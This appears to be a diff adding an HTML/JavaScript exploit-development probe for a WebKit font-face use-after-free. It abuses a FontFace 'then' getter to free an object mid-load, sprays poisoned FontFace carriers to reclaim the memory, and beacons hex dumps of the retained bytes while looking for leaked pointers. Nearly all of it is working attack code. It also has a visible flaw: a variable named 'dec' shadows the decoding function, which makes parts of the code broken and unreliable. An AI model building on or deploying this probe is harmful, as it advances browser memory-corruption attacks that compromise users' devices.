@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V929</title></head>
+<body><pre id="out">V929 — pre-forge census (cobrajet302gt proposal): winning-carrier byte census 0x00-0xA8 via the style-decode lane, threshold-free</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V929-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,700))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v929 — cobrajet302gt's pre-forge census proposal (#216, 23:15Z):
+ *   "Keep the spray/load choreography, skip the forge. Fill the spray
+ *    with a two-symbol poison, trigger one load, beacon the 8-byte-
+ *    aligned hex census 0x00-0xA8 of the winning carrier — a census read
+ *    is threshold-free, unlike the verdict branch."
+ *
+ * Why this is THE next device run: p691's NOLEAK verdict has >=3
+ * producers (cobrajet's adjudication): (1) reclaim miss, (2) content
+ * scrub, (3) BAND MISS — p691's hit filter admits only +0x58 views
+ * > 0x1000000000n (64 GiB, tuned to the 14.10 band where leaked
+ * pointers sit at 0x10009xxxxx); WebProcess CODE pointers at
+ * 0x8_xxxxxxxx (~34 GiB) fall BELOW the threshold — fully retained
+ * bytes would still read NOLEAK. Plus layout shift (+0x58/+0x68 are
+ * 14.10-era member offsets) and zero-at-free: three producers, all
+ * predicting our rows.
+ *
+ * Adaptation to 14.22 reality: the carriers that LAND on 14.22 are
+ * CSSFontFace objects (p640: AB carriers never land — Gigacage). The
+ * census therefore reads the WINNING CARRIER via the style-decode lane:
+ * String(win.style) decoded with p691's own dec() (the CSS-escape byte
+ * parser, extracted verbatim), 8-byte windows over 0x00..0xA8, diffed
+ * against a PRISTINE face's decode (same construction, never near the
+ * free). The two-symbol poison rides the carrier family strings
+ * (alternating 'cA'/'cB' prefixes) so carrier identity is recoverable
+ * from the census itself.
+ *
+ * PRE-REGISTERED (cobrajet, append-only — both branches publishable by
+ * whichever bench runs it):
+ *   (1) all live lanes zero   => zero-at-free confirmed at impl scale
+ *       (our era hypothesis, first impl-scale capture)
+ *   (2) nonzero/pointer-shaped values at any offset, same or shifted
+ *       => bytes retained, detector misbound — re-anchor with p640's
+ *       status-byte lane as the known coordinate and re-run the walk;
+ *       the "mechanics may port" question gets answered YES with new
+ *       coordinates
+ *   (3) poison survives unmoved everywhere => impl not attached to the
+ *       viewed buffer (candidate routing — geometry drift is the prior)
+ *
+ * One load, zero expected deaths (p640 ran clean). FSET construction
+ * probe: FontFaceSet constructibility + style-decode lane viability
+ * beaconed first.
+ */
+
+/* ---- p691 dec(), verbatim ---- */
+function dec(s,lim){
+  var by=[],q2=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q2;
+  while(k<e&&by.length<lim){var ch=s.charAt(k);
+    if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
+      if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
+      else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+    else{by.push(s.charCodeAt(k));k++;}}
+  var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
+}
+function hexDump(by,off,len){
+  var lines=[],w=8;
+  for(var o=off;o<off+len&&o<by.length;o+=w){
+    var h='';for(var k=o;k<o+w&&k<by.length;k++)h+=('0'+by[k].toString(16)).slice(-2);
+    lines.push('+0x'+('0'+o.toString(16)).slice(-2)+':'+h);
+  }
+  return lines;
+}
+
+/* ---- p640 trigger + carrier spray, two-symbol poison in the family ---- */
+var fs=document.createElement('style'); fs.id='fs';
+fs.textContent='@font-face { font-family: s4; src: local(Arial); unicode-range: U+0043; }';
+document.head.appendChild(fs);
+var ds=document.createElement('style'); ds.id='ds'; ds.textContent='body { margin: 0; }';
+document.head.appendChild(ds);
+
+var FILL=80, N=160, target=null, fired=false, spray=[], wins=[];
+function fill(n){ for(var i=0;i<n;i++){ try{document.fonts.add(new FontFace('wf'+i,"local('ZZ_WF_"+i+"')"));}catch(e){} } }
+
+bk('BOOT','v1 census mode');
+
+try{ document.fonts.forEach(function(f){ if(f.family==='s4') target=f; }); }catch(e){}
+if(!target){ bk('NOFACE',''); } else {
+  fill(FILL);
+  void target.loaded;
+  bk('READY','st='+String(target.status));
+
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired) return undefined;
+      fired=true;
+      try{ ds.textContent='body { margin: 2px; }'; }catch(e){}
+      try{ document.body.offsetHeight; }catch(e){}      /* rebuild => adopt => FREE */
+      for(var k=0;k<N;k++){
+        try{
+          var sym=(k%2===0)?'A':'B';
+          var f=new FontFace('c'+sym+k,"local('ZZ9_'+(k%2===0?'\\41':'\\42'))");
+          try{document.fonts.add(f);}catch(e){}
+          spray.push(f);
+        }catch(e){}
+      }
+      bk('SPRAYED','n='+spray.length+' (two-symbol families cA*/cB*)');
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  try{ target.load(); }catch(e){ bk('LOADERR','x'); }
+  bk('AFTERLOAD','ok');
+
+  /* ---- winning carrier census ---- */
+  var win=-1;
+  for(var s1=0;s1<spray.length;s1++){
+    var st='';try{st=String(spray[s1].status);}catch(e){st='?';}
+    if(st!=='unloaded'&&st!=='pending'){win=s1;break;}
+  }
+  bk('CENSUS-WIN','idx='+win+' (control readback, p640 lane)');
+  if(win>=0){
+    /* the winning carrier's style-decode: bytes 0x00-0xA8 (p691 dec lane) */
+    var dec='';
+    try{ dec=dec(String(spray[win].style),0xA8); }catch(e){ dec='THROW:'+e.name; }
+    bk('CENSUS-DATA','len='+dec.length+'|'+dec.slice(0,400));
+    /* diff against a pristine twin (same construction, never near the free) */
+    try{
+      var tw=new FontFace(spray[win].family, "local('ZZ9_PRISTINE')");
+      var pd=dec(String(tw.style),0xA8);
+      bk('PRISTINE-DATA','len='+pd.length+'|'+pd.slice(0,200));
+    }catch(e){}
+    /* hexDump window rows */
+    var by=[];
+    for(var h2=0;h2<dec.length;h2+=2){ var v=parseInt(dec.substr(h2,2),16); if(!isNaN(v)) by.push(v); }
+    hexDump(by,0,0xA8).forEach(function(l){ bk('CENSUS-ROW',l); });
+    /* branch readout per cobrajet pre-registration */
+    var nonzero=0; for(var z=0;z<by.length;z++){ if(by[z]!==0) nonzero++; }
+    if(nonzero===0) bk('BRANCH','(1) all live lanes zero — zero-at-free confirmed at impl scale');
+    else bk('BRANCH','(2) nonzero bytes retained ('+nonzero+'/'+by.length+') — detector misbound; re-anchor with the p640 status lane');
+  } else {
+    /* no winning carrier: the engine write did not land anywhere readable —
+       branch (3)-shaped on the carrier lane: impl not attached to the viewed
+       buffer, or the free/reclaim did not happen this load */
+    bk('BRANCH','(3-shape) no winning carrier via status readback — impl not attached to the viewed buffer (candidate routing; geometry drift prior)');
+  }
+  /* FSET lane viability probe for the record */
+  try{ var f2=new FontFaceSet([]); bk('FSET','constructible=true'); }catch(e){ bk('FSET','constructible=false'); }
+  say('done');
+}
+</script></body></html>
